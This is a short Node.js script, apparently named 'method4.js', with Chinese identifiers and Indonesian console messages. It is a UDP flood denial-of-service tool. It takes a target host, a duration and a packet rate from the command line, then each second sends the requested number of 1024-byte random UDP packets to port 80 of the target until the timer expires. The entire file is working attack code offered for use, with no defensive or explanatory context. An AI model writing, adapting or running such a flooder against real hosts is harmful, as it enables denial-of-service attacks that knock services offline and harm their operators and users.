const 小吴dgram = require('dgram'), 小吴随机 = require('randomstring');
const 小吴参数 = process.argv.slice(2);

if (小吴参数.length < 3) {
    console.log("Usage: node method4.js <host> <time> <rate>");
    process.exit(-1);
}

const 小吴主机 = 小吴参数[0], 小吴时间 = parseInt(小吴参数[1]), 小吴速率 = parseInt(小吴参数[2]);
const 小吴端口 = 80, 小吴客户端 = 小吴dgram.createSocket('udp4');

console.log(`🔥 UDP Flood ke ${小吴主机}:${小吴端口} selama ${小吴时间}s @ ${小吴速率} packet/s`);

const 小吴循环 = setInterval(() => {
    for (let 小吴i = 0; 小吴i < 小吴速率; 小吴i++) {
        const 小吴消息 = Buffer.from(小吴随机.generate(1024));
        小吴客户端.send(小吴消息, 0, 小吴消息.length, 小吴端口, 小吴主机, (小吴错误) => {
            if (小吴错误) console.log("❌ UDP 错误: " + 小吴错误.message);
            else console.log(`📡 UDP Packet ke ${小吴主机}`);
        });
    }
}, 1000);

setTimeout(() => {
    clearInterval(小吴循环);
    小吴客户端.close();
    console.log("✅ UDP Flood 完成!");
}, 小吴时间 * 1000);
